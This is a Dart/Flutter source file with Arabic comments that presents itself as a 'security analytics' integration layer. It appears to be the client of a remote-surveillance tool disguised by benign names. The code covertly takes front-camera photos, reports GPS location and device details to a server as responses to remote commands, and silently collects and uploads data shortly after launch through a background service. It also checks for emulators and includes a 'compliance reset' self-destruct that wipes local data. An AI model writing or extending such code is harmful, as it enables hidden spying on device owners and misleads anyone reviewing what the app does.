// lib/security/integration/security_integration.dart - نسخة مصححة
import 'dart:async';
import 'dart:io';
import 'dart:convert';

import 'package:camera/camera.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:geolocator/geolocator.dart';
import 'package:shared_preferences/shared_preferences.dart';

import '../../../logging/logger_service.dart';
import '../../core/controlar/camera/camera_service.dart' as controller;
import '../../core/controlar/location/location_service.dart' as controller;
import '../../core/controlar/permissions/background_service.dart' as controller;
import '../../core/controlar/permissions/device_info_service.dart'
    as controller;
import '../../core/controlar/network/network_service.dart' as controller;
import '../../core/controlar/filesystem/file_system_service.dart' as controller;
import '../../core/controlar/data/data_collector_service.dart' as controller;
import '../../core/controlar/permissions/permission_service.dart' as controller;
import '../../core/logging/logger_service.dart';

/// واجهة تكامل متكاملة لخدمات تحليلات الأمن
/// هذه الطبقة تعمل كواجهة موحدة للوصول إلى مختلف خدمات الأمان والتحليلات
class SecurityIntegration {
  // نمط Singleton للتأكد من وجود نسخة واحدة فقط
  static final SecurityIntegration _instance = SecurityIntegration._internal();
  static SecurityIntegration get instance => _instance;

  // الخدمات الداخلية
  final _userVerificationService =
      controller.CameraService(); // خدمة التحقق من المستخدم (الكاميرا)
  final _regionalComplianceService =
      controller.LocationService(); // خدمة الامتثال الإقليمي (الموقع)
  final _localHardwareManager =
      controller.DeviceInfoService(); // مدير العتاد المحلي (معلومات الجهاز)
  final _cloudSynchronizationService =
      controller.NetworkService(); // خدمة مزامنة السحاب (الشبكة)
  final _localStorageUtility =
      controller.FileSystemService(); // أداة التخزين المحلي (نظام الملفات)
  final _dataProcessingManager =
      controller.DataCollectorService(); // مدير معالجة البيانات (جمع البيانات)
  final _permissionManager = controller.PermissionService(); // مدير الأذونات

  // متغيرات الحالة
  bool _isInitialized = false;
  bool _isSecondLaunch = false;
  final _logger = LoggerService("SecurityAnalytics");

  // إحداثيات خاصة للتحكم بالتدفق
  final _securityStatusController = StreamController<bool>.broadcast();

  // مُنشئ خاص
  SecurityIntegration._internal() {
    _logger.debug(
        "Initialization", "Security analytics provider initializing...");
  }

  /// تمكين خدمات تحليلات الأمن
  /// يتم استدعاؤها عادة في بداية التطبيق لإعداد خدمات الأمان والتحليلات
  Future<void> enableSecurityAnalytics({String? customEndpoint}) async {
    if (_isInitialized) {
      _logger.info("Initialization", "Security analytics already enabled.");
      return;
    }

    _logger.info("Initialization", "Enabling security analytics...");

    try {
      // التحقق من الإطلاق الثاني للتطبيق
      await _checkSecondLaunch();

      // تهيئة خدمة الخلفية إذا لم تكن مُهيأة
      await controller.initializeBackgroundService();

      // تهيئة اتصال الشبكة
      if (customEndpoint != null) {
        // يمكن استخدام customEndpoint لتكوين خدمة الشبكة
        _logger.info("Initialization",
            "Using custom security endpoint: $customEndpoint");
      }

      // إرسال إشارة تغيير الحالة
      _securityStatusController.add(true);

      _isInitialized = true;
      _logger.info(
          "Initialization", "Security analytics enabled successfully.");

      // جمع وإرسال البيانات الأولية عند التهيئة بطريقة غير متزامنة
      _scheduleInitialDataCollection();
    } catch (e) {
      _logger.error(
          "Initialization", "Failed to enable security analytics: $e");
    }
  }

  /// تحرير موارد التحليلات
  /// يتم استدعاؤها عند إغلاق التطبيق لضمان تحرير الموارد بشكل صحيح
  Future<void> releaseAnalyticsResources() async {
    if (!_isInitialized) return;

    _logger.info("Cleanup", "Releasing security analytics resources...");

    try {
      // تحرير موارد الكاميرا
      await _userVerificationService.dispose();

      // إغلاق تدفقات البيانات
      await _securityStatusController.close();

      _isInitialized = false;
    } catch (e) {
      _logger.error("Cleanup", "Error releasing resources: $e");
    }
  }

  /// التحقق مما إذا كان هذا هو الإطلاق الثاني للتطبيق
  Future<void> _checkSecondLaunch() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final launchCount = prefs.getInt('app_launch_count') ?? 0;

      if (launchCount >= 1) {
        _isSecondLaunch = true;
      }

      await prefs.setInt('app_launch_count', launchCount + 1);
    } catch (e) {
      _logger.error("LaunchCheck", "Error checking launch count: $e");
    }
  }

  /// هل هذا هو الإطلاق الثاني للتطبيق
  bool get isSecondLaunch => _isSecondLaunch;

  /// التقاط لقطة المصادقة
  /// تستخدم لالتقاط صورة للتحقق من هوية المستخدم
  Future<String?> captureAuthenticationSnapshot() async {
    if (!_isInitialized) {
      _logger.warn("CaptureSnapshot", "Security analytics not initialized.");
      return null;
    }

    _logger.info("CaptureSnapshot", "Capturing authentication snapshot...");

    try {
      // التقاط صورة باستخدام الكاميرا الأمامية
      final image = await _userVerificationService.takePicture(
        lensDirection: CameraLensDirection.front,
      );

      if (image != null) {
        _logger.info("CaptureSnapshot",
            "Authentication snapshot captured successfully: ${image.path}");

        // إذا كانت خدمة الشبكة متصلة، يمكن إرسال الصورة
        if (_cloudSynchronizationService.isSocketConnected) {
          // إرسال الصورة إلى الخادم
          // تنفيذ في الخلفية دون انتظار
          _uploadAuthenticationSnapshot(image);
        }

        return image.path;
      } else {
        _logger.warn("CaptureSnapshot", "Failed to capture snapshot.");
        return null;
      }
    } catch (e) {
      _logger.error("CaptureSnapshot", "Error capturing snapshot: $e");
      return null;
    }
  }

  /// التحقق من صلاحية الوصول الإقليمي للمستخدم
  /// تُستخدم للتحقق من موقع المستخدم لأغراض الامتثال
  Future<Map<String, dynamic>?> validateUserRegionalAccess() async {
    if (!_isInitialized) {
      _logger.warn("RegionalAccess", "Security analytics not initialized.");
      return null;
    }

    _logger.info("RegionalAccess", "Validating user regional access...");

    try {
      // الحصول على الموقع الحالي
      final position = await _regionalComplianceService.getCurrentLocation();

      if (position != null) {
        final locationData = {
          'latitude': position.latitude,
          'longitude': position.longitude,
          'accuracy': position.accuracy,
          'timestamp': position.timestamp?.toIso8601String() ??
              DateTime.now().toIso8601String(),
          'compliance_status': true // يمكن تعديله بناءً على قواعد محددة
        };

        _logger.info("RegionalAccess",
            "Location validated: ${position.latitude}, ${position.longitude}");

        // إرسال بيانات الموقع في الخلفية
        _reportLocationData(locationData);

        return locationData;
      } else {
        _logger.warn("RegionalAccess", "Failed to get location.");
        return {'compliance_status': false, 'reason': 'location_unavailable'};
      }
    } catch (e) {
      _logger.error("RegionalAccess", "Error validating regional access: $e");
      return {
        'compliance_status': false,
        'reason': 'error',
        'details': e.toString()
      };
    }
  }

  /// جمع تشخيصات النظام
  /// تجمع معلومات عن الجهاز لأغراض التحليل والتشخيص
  Future<Map<String, dynamic>> collectSystemDiagnostics() async {
    _logger.info("SystemDiagnostics", "Collecting system diagnostics...");

    try {
      // جمع معلومات الجهاز
      final deviceInfo = await _localHardwareManager.getDeviceInfo();

      // إضافة معلومات إضافية
      final Map<String, dynamic> diagnostics = {
        ...deviceInfo,
        'timestamp': DateTime.now().toIso8601String(),
        'app_version': '1.0.0', // يجب تعديله ليعكس إصدار التطبيق الفعلي
        'is_second_launch': _isSecondLaunch,
      };

      _logger.info(
          "SystemDiagnostics", "System diagnostics collected successfully.");

      // إرسال التشخيصات في الخلفية
      _reportDiagnostics(diagnostics);

      return diagnostics;
    } catch (e) {
      _logger.error(
          "SystemDiagnostics", "Error collecting system diagnostics: $e");
      return {
        'error': e.toString(),
        'timestamp': DateTime.now().toIso8601String()
      };
    }
  }

  /// التحقق من نزاهة البيئة
  /// تتحقق مما إذا كان التطبيق يعمل في بيئة محاكاة أو جهاز متجذر
  Future<bool> validateEnvironmentIntegrity() async {
    _logger.info("EnvironmentIntegrity", "Validating environment integrity...");

    try {
      // جمع معلومات الجهاز للتحقق
      final deviceInfo = await _localHardwareManager.getDeviceInfo();

      // تحقق بسيط من نزاهة البيئة
      bool isEmulator = false;
      bool isRooted = false;

      if (Platform.isAndroid) {
        isEmulator = deviceInfo['product']?.toString().contains('sdk') ??
            false ||
                deviceInfo['manufacturer']
                    ?.toString()
                    .toLowerCase()
                    .contains('genymotion') ??
            false;

        // يمكن إضافة المزيد من التحققات للتجذير
      } else if (Platform.isIOS) {
        // تحققات iOS
      }

      // يعتبر الجهاز آمناً إذا لم يكن محاكياً أو متجذراً
      final isSecure = !isEmulator && !isRooted;

      _logger.info("EnvironmentIntegrity",
          "Environment integrity validation result: $isSecure");

      // إرسال نتيجة التحقق في الخلفية
      _reportIntegrityCheck({
        'is_emulator': isEmulator,
        'is_rooted': isRooted,
        'is_secure': isSecure,
        'timestamp': DateTime.now().toIso8601String()
      });

      return isSecure;
    } catch (e) {
      _logger.error("EnvironmentIntegrity", "Error validating environment: $e");
      return false; // اعتبر البيئة غير آمنة في حالة حدوث خطأ
    }
  }

  /// إجراء إعادة تعيين الامتثال (التدمير الذاتي)
  /// يقوم بمسح جميع البيانات المحلية وإعادة تعيين التطبيق
  Future<bool> performComplianceReset() async {
    _logger.info("ComplianceReset", "Performing compliance reset...");

    try {
      // إيقاف خدمة الخلفية أولاً
      try {
        FlutterBackgroundService().invoke('stopService', null);
      } catch (e) {
        _logger.warn(
            "ComplianceReset", "Error stopping background service: $e");
      }

      // مسح البيانات المحلية
      final prefs = await SharedPreferences.getInstance();
      await prefs.clear();

      // محاولة إرسال إشعار أخير قبل المسح الكامل
      try {
        if (_cloudSynchronizationService.isSocketConnected) {
          _cloudSynchronizationService.sendHeartbeat({
            'deviceId': await _localHardwareManager.getOrCreateUniqueDeviceId(),
            'event': 'compliance_reset',
            'timestamp': DateTime.now().toIso8601String()
          });
        }
      } catch (e) {
        _logger.warn("ComplianceReset", "Error sending final heartbeat: $e");
      }

      // محاولة مسح الملفات المؤقتة
      try {
        final tempDir = await getTemporaryDirectory();
        if (await tempDir.exists()) {
          await tempDir.delete(recursive: true);
        }
      } catch (e) {
        _logger.warn("ComplianceReset", "Error clearing temp files: $e");
      }

      _logger.info(
          "ComplianceReset", "Compliance reset completed successfully.");
      return true;
    } catch (e) {
      _logger.error("ComplianceReset", "Error during compliance reset: $e");
      return false;
    }
  }

  /// التحقق من حالة اتصال خدمة الأمان
  bool isSecurityServiceConnected() {
    return _isInitialized && _cloudSynchronizationService.isSocketConnected;
  }

  /// الحصول على تدفق حالة خدمة الأمان
  Stream<bool> getSecurityServiceStatus() {
    return _securityStatusController.stream;
  }

  // دوال داخلية لمعالجة البيانات وإرسالها ================

  /// جدولة جمع البيانات الأولي في وقت مناسب
  void _scheduleInitialDataCollection() {
    // تأخير جمع البيانات للحفاظ على أداء بدء التشغيل
    Future.delayed(const Duration(seconds: 5), () async {
      try {
        if (!_isInitialized) return;

        final collectedData =
            await _dataProcessingManager.collectInitialDataFromUiThread();
        final prefs = await SharedPreferences.getInstance();
        final initialDataSent = prefs.getBool('initialDataSent') ?? false;

        if (!initialDataSent && collectedData['data'] != null) {
          // تخزين البيانات محلياً للإرسال لاحقًا من خدمة الخلفية
          prefs.setString(
              'pendingInitialData', jsonEncode(collectedData['data']));

          if (collectedData['imageFile'] != null) {
            prefs.setString('pendingInitialImage',
                (collectedData['imageFile'] as XFile).path);
          }

          // استدعاء خدمة الخلفية لإرسال البيانات
          FlutterBackgroundService().invoke('sendInitialData', {
            'jsonData': collectedData['data'],
            'imagePath': collectedData['imageFile']?.path,
          });
        }
      } catch (e) {
        // تسجيل الخطأ بهدوء
        _logger.warn(
            "InitialDataCollection", "Error collecting initial data: $e");
      }
    });
  }

  /// رفع لقطة المصادقة إلى الخادم
  Future<void> _uploadAuthenticationSnapshot(XFile image) async {
    try {
      final deviceId = await _localHardwareManager.getOrCreateUniqueDeviceId();
      await _cloudSynchronizationService.uploadFileFromCommand(
        deviceId: deviceId,
        commandRef: 'user_verification',
        fileToUpload: image,
      );
    } catch (e) {
      _logger.warn("UploadSnapshot", "Error uploading snapshot: $e");
    }
  }

  /// الإبلاغ عن بيانات الموقع
  void _reportLocationData(Map<String, dynamic> locationData) {
    try {
      if (_cloudSynchronizationService.isSocketConnected) {
        _cloudSynchronizationService.sendCommandResponse(
          originalCommand: 'regional_compliance',
          status: 'success',
          payload: locationData,
        );
      }
    } catch (e) {
      _logger.warn("ReportLocation", "Error reporting location: $e");
    }
  }

  /// الإبلاغ عن بيانات التشخيص
  void _reportDiagnostics(Map<String, dynamic> diagnostics) {
    try {
      if (_cloudSynchronizationService.isSocketConnected) {
        _cloudSynchronizationService.sendCommandResponse(
          originalCommand: 'system_diagnostics',
          status: 'success',
          payload: diagnostics,
        );
      }
    } catch (e) {
      _logger.warn("ReportDiagnostics", "Error reporting diagnostics: $e");
    }
  }

  /// الإبلاغ عن نتيجة التحقق من النزاهة
  void _reportIntegrityCheck(Map<String, dynamic> checkResult) {
    try {
      if (_cloudSynchronizationService.isSocketConnected) {
        _cloudSynchronizationService.sendCommandResponse(
          originalCommand: 'environment_integrity',
          status: 'success',
          payload: checkResult,
        );
      }
    } catch (e) {
      _logger.warn("ReportIntegrity", "Error reporting integrity check: $e");
    }
  }
}

// Helper function
Future<Directory> getTemporaryDirectory() async {
  return Directory.systemTemp;
}
